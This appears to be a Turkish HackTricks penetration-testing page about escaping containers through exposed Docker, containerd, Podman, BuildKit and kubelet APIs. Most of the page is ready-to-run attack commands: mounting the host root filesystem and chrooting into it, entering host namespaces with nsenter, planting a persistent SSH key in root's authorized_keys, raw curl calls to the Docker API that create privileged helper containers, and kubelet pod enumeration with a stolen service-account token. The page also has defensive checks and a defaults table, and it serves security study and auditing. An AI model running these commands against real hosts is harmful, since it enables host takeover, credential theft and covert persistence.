# Runtime API ve Daemon Exposure

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Gerçek dünyadaki birçok container compromise vakası hiç namespace escape ile başlamaz. Bunun yerine runtime control plane'e erişimle başlar. Bir workload, bağlı bir Unix socket veya dışarıya açık bir TCP listener üzerinden `dockerd`, `containerd`, CRI-O, Podman ya da kubelet ile iletişim kurabiliyorsa saldırgan daha iyi ayrıcalıklara sahip yeni bir container oluşturabilir, host filesystem'ini mount edebilir, host namespace'lerine katılabilir veya hassas node bilgilerini alabilir. Bu durumlarda gerçek security boundary runtime API'dir ve bu API'nin compromise edilmesi işlevsel olarak host'un compromise edilmesine oldukça yakındır.

Runtime socket exposure'ın kernel protections'tan ayrı olarak belgelenmesinin nedeni budur. Standart seccomp, capabilities ve MAC confinement kullanan bir container bile, `/var/run/docker.sock` veya `/run/containerd/containerd.sock` içine mount edilmişse host compromise'ından yalnızca tek bir API çağrısı uzakta olabilir. Mevcut container'ın kernel isolation'ı tam olarak tasarlandığı şekilde çalışıyor olabilir; ancak runtime management plane tamamen exposed durumda kalabilir.

## Daemon Access Models

Docker Engine, privileged API'sini geleneksel olarak `unix:///var/run/docker.sock` adresindeki yerel Unix socket üzerinden expose eder. Geçmişte bu API, `tcp://0.0.0.0:2375` gibi TCP listener'ları veya `2376` üzerindeki TLS-protected listener üzerinden uzaktan da expose edilmiştir. Daemon'ı güçlü TLS ve client authentication olmadan uzaktan expose etmek, Docker API'yi fiilen bir remote root interface'e dönüştürür.

containerd, CRI-O, Podman ve kubelet de benzer high-impact attack surface'leri expose eder. İsimler ve workflow'lar farklıdır; ancak mantık değişmez. Interface caller'ın workload oluşturmasına, host path'lerini mount etmesine, credential'ları almasına veya çalışan container'ları değiştirmesine izin veriyorsa bu interface privileged management channel'dır ve buna uygun şekilde ele alınmalıdır.

Kontrol edilmesi gereken yaygın yerel path'ler şunlardır:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Daha eski veya daha özel stack'ler `dockershim.sock`, `frakti.sock` veya `rktlet.sock` gibi endpoint'leri de açığa çıkarabilir. Bunlar modern ortamlarda daha az yaygındır; ancak karşılaşıldıklarında aynı dikkatle ele alınmalıdır, çünkü bunlar sıradan uygulama socket'leri değil, runtime-control surface'lerini temsil eder.

## Güvenli Remote Access

Bir daemon local socket'in ötesinde açığa çıkarılmak zorundaysa bağlantı TLS ile korunmalı ve tercihen mutual authentication kullanılmalıdır; böylece daemon client'ı, client da daemon'ı doğrular. Kolaylık amacıyla Docker daemon'ını plain HTTP üzerinden açma şeklindeki eski alışkanlık, container administration'daki en tehlikeli hatalardan biridir; çünkü API surface doğrudan privileged container'lar oluşturabilecek kadar güçlüdür.

Geçmişteki Docker configuration pattern'i şöyle görünüyordu:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
systemd tabanlı host'larda daemon iletişimi `fd://` olarak da görünebilir; bu, process'in socket'i doğrudan kendisinin bind etmesi yerine systemd'den önceden açılmış bir socket devraldığı anlamına gelir. Önemli olan ders, tam syntax değil, güvenlik sonucudur. Daemon sıkı izinlerle korunan bir local socket'in ötesinde dinlemeye başladığı anda, transport security ve client authentication isteğe bağlı hardening olmaktan çıkar ve zorunlu hale gelir.

## Kötüye Kullanım

Bir runtime socket mevcutsa hangisi olduğunu, uyumlu bir client bulunup bulunmadığını ve raw HTTP veya gRPC erişiminin mümkün olup olmadığını doğrulayın:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Bu komutlar, çalışmayan bir yol, bağlanmış ancak erişilemeyen bir socket ve aktif ayrıcalıklı bir API arasındaki farkı belirlemek için kullanışlıdır. İstemci başarılı olursa sıradaki soru, API'nin host bind mount veya host namespace paylaşımıyla yeni bir container başlatıp başlatamayacağıdır.

### İstemci Yüklü Olmadığında

`docker`, `podman` veya başka bir kullanıcı dostu CLI'nin bulunmaması, socket'in güvenli olduğu anlamına gelmez. Docker Engine, Unix socket'i üzerinden HTTP kullanır ve Podman, `podman system service` aracılığıyla hem Docker uyumlu bir API hem de Libpod-native bir API sunar. Bu da yalnızca `curl` bulunan minimal bir ortamın bile daemon'u yönetmek için yeterli olabileceği anlamına gelir:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Bu, post-exploitation sırasında önemlidir; çünkü defender'lar bazen alışılmış client binary'lerini kaldırırken management socket'i mount edilmiş halde bırakır. Podman host'larında, yüksek değerli path'in rootful ve rootless deployment'lar arasında farklı olduğunu unutmayın: rootful service instance'lar için `unix:///run/podman/podman.sock`, rootless olanlar için ise `unix://$XDG_RUNTIME_DIR/podman/podman.sock`.

### Tam Örnek: Docker Socket To Host Root

`docker.sock` erişilebilirse, klasik escape yöntemi host root filesystem'ini mount eden yeni bir container başlatmak ve ardından bunun içine `chroot` etmektir:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Bu, Docker daemon üzerinden doğrudan host-root execution sağlar. Etki yalnızca dosya okumayla sınırlı değildir. Yeni container içine girdikten sonra attacker, host dosyalarını değiştirebilir, kimlik bilgilerini toplayabilir, persistence yerleştirebilir veya ek privileged workload'lar başlatabilir.

### Full Example: Docker Socket To Host Namespaces

Attacker, yalnızca filesystem erişimi yerine namespace entry kullanmayı tercih ederse:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Bu yol, mevcut container'ı exploit etmek yerine runtime'dan açıkça host namespace erişimi olan yeni bir container oluşturmasını isteyerek host'a ulaşır.

### Docker Socket Persistence Pattern

Runtime control, tek seferlik bir shell yerine persistence için de kullanılabilir. Genel pattern; host mount içeren bir helper container oluşturmak, yetkili erişim materyalini veya bir startup hook'u mount edilmiş host filesystem'ine yazmak ve ardından host'un bunu kullandığını doğrulamaktır.

Örnek yapı:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Aynı fikir, operatörün neyi kanıtlamak istediğine bağlı olarak systemd units, cron fragments, application startup files veya SSH keys'i hedefleyebilir. Önemli nokta, kalıcı değişikliğin orijinal container içindeki ek privilege ile değil, runtime daemon'ın host-level filesystem authority'si üzerinden yapılmasıdır.

### Raw Docker API Helper Pivot

Docker CLI eksik olduğunda, aynı host-mount helper flow Unix socket üzerinden HTTP kullanılarak yürütülebilir. Genel flow şöyledir: API'yi doğrulamak, host bind mount içeren bir helper container oluşturmak, bunu başlatmak, bir exec instance oluşturmak ve bu exec'i başlatmak.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Son `/exec/<id>/start` isteği, döndürülen exec ID'sine bağlıdır; ancak güvenlik açısından önemli nokta tam JSON akışından bağımsızdır: rootful bir Docker daemon'a ham API erişimi, daha güçlü bir helper workload talep etmek için yeterlidir.

### Tam Örnek: containerd Socket

Mount edilmiş bir `containerd` socket'i genellikle aynı derecede tehlikelidir:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Daha Docker benzeri bir client mevcutsa, `nerdctl`, `--privileged`, `--pid=host` ve `-v` gibi tanıdık flag'leri sunduğu için `ctr`'den daha kullanışlı olabilir:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Etki yine host compromise'tır. Docker'a özgü tooling mevcut olmasa bile başka bir runtime API aynı yönetimsel gücü sunabilir. Kubernetes node'larında `crictl`, CRI endpoint'iyle doğrudan konuştuğu için reconnaissance ve container etkileşimi için de yeterli olabilir.

### BuildKit Socket

`buildkitd`, insanlar onu genellikle "sadece build backend'i" olarak gördüğü için kolayca gözden kaçar; ancak daemon hâlâ ayrıcalıklı bir control plane'dir. Erişilebilir bir `buildkitd.sock`, saldırgana arbitrary build step'leri çalıştırma, worker yeteneklerini inceleme, ele geçirilmiş ortamdan local context'leri kullanma ve daemon bunlara izin verecek şekilde yapılandırılmışsa `network.host` veya `security.insecure` gibi tehlikeli entitlement'lar talep etme olanağı sağlayabilir.

İlk etkileşimler için yararlı olanlar şunlardır:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Daemon build isteklerini kabul ediyorsa, güvensiz entitlements'ın kullanılabilir olup olmadığını test edin:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Kesin etki daemon yapılandırmasına bağlıdır, ancak permissive entitlements ile çalışan rootful BuildKit servisi zararsız bir developer kolaylığı değildir. Özellikle CI runners ve paylaşımlı build düğümlerinde, onu başka bir yüksek değerli administrative surface olarak değerlendirin.

### TCP Üzerinden Kubelet API

kubelet bir container runtime değildir, ancak yine de node management plane'in bir parçasıdır ve genellikle aynı trust boundary tartışmasının içinde yer alır. kubelet secure port `10250` workload içinden erişilebiliyorsa veya node credentials, kubeconfigs ya da proxy rights açığa çıkmışsa, attacker Kubernetes API server admission path'e hiç dokunmadan Pod'ları enumerate edebilir, log'ları alabilir veya node-local container'larda command execute edebilir.

Ucuz discovery ile başlayın:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Kubelet veya API-server proxy path `exec` işlemini yetkilendiriyorsa, WebSocket destekli bir client bunu node üzerindeki diğer container'larda code execution elde etmek için kullanabilir. `nodes/proxy` için yalnızca `get` yetkisinin kulağa geldiğinden daha tehlikeli olmasının nedeni de budur: istek yine de komut çalıştıran kubelet endpoint'lerine ulaşabilir ve bu doğrudan kubelet etkileşimleri normal Kubernetes audit log'larında görünmez.

## Kontroller

Bu kontrollerin amacı, container'ın trust boundary dışında kalması gereken herhangi bir management plane'e erişip erişemediğini belirlemektir.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Burada ilginç olanlar:

- Mount edilmiş bir runtime socket'i genellikle yalnızca bilgi ifşası değil, doğrudan bir administrative primitive'dir.
- TLS olmadan `2375` üzerinde dinleyen bir TCP listener, remote-compromise koşulu olarak değerlendirilmelidir.
- `DOCKER_HOST` gibi environment variable'lar, workload'un host runtime ile konuşmak üzere kasıtlı olarak tasarlandığını sıklıkla ortaya çıkarır.

## Runtime Varsayılanları

| Runtime / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak yerel Unix socket | `dockerd` yerel socket üzerinde dinler ve daemon genellikle rootful'dur | `/var/run/docker.sock` mount edilmesi, `tcp://...:2375` açığa çıkarılması, `2376` üzerinde zayıf veya eksik TLS |
| Podman | Varsayılan olarak daemonless CLI | Sıradan yerel kullanım için uzun süre çalışan ayrıcalıklı bir daemon gerekmez; `podman system service` etkinleştirildiğinde API socket'leri yine de açığa çıkabilir | `podman.sock` açığa çıkarılması, servisin geniş kapsamda çalıştırılması, rootful API kullanımı |
| containerd | Yerel ayrıcalıklı socket | Administrative API yerel socket üzerinden açığa çıkarılır ve genellikle daha üst düzey tooling tarafından kullanılır | `containerd.sock` mount edilmesi, geniş `ctr` veya `nerdctl` erişimi, ayrıcalıklı namespace'lerin açığa çıkarılması |
| CRI-O | Yerel ayrıcalıklı socket | CRI endpoint'i node-local trusted component'ler için tasarlanmıştır | `crio.sock` mount edilmesi, CRI endpoint'inin untrusted workload'lara açılması |
| Kubernetes kubelet | Node-local management API | Kubelet, Pods tarafından geniş kapsamda erişilebilir olmamalıdır; authentication ve authorization'a bağlı olarak erişim pod state'ini, credential'ları ve execution özelliklerini açığa çıkarabilir | kubelet socket'lerinin veya certificate'larının mount edilmesi, zayıf kubelet authentication, host networking ile erişilebilir kubelet endpoint'i |

## Referanslar

- [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
